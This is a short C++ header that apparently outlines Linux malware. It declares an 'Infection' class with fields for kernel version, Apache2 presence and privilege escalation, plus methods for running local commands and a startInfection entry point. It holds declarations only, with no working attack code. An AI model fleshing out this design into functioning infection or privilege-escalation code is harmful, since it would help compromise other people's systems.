#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <cstring>
#include <string>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#pragma once

struct FileInformations{
	const char* fileName;
	int fileSize;
	int fileLinks;
	int fileiNode;
	char filePermissions[];
};

class FileUtilities{
public:
	void write2File();
};

class Networking {
public:
	void enumerateAdapters();
};

class Infection : public Networking, public FileUtilities {
private:
	//Variables
	char* user;
	bool isApache2Present;
	char* KernelRelease;
	char* KernelVersion;
	bool canInstall;
	bool tryPrivilegeEscalation;
	bool InstallRequirements;
	//Fonctions
	FileInformations GetFileInformations(const char* fileName);
	void askForPrivilegeEscalation();
	void GetLinuxVersion();
	void runLocalCommand(const char* commandToRun, const char* errorMessage);
	void runLocalCommand(const char* commandToRun, const char* errorMessage, const char* successMessage);
	void runLocalCommand(const char* commandToRun, const char* errorMessage, const char* successMessage, const char* vOutput);
public:
	bool startInfection();
};	
